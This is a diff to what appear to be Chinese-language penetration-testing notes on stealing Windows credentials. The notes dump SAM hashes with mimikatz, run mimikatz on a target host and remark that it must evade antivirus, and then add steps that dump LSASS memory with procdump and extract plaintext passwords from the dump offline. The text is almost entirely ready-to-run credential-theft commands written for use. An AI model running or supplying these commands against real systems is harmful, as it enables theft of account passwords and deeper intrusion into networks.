@@ -19,3 +19,12 @@ mimikatz "lsadump::sam /sam:Sam.hiv /system:Sys.hiv" exit
 把mimikatz拖到目标主机获取密码（根据实际需要，mimikatz需要免杀）
 
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"
+
+通过 Procdump 获取 lsass 抓内存中的明文密码
+
+通过procdump下载lsass信息
+
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+回传本地获取密码
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
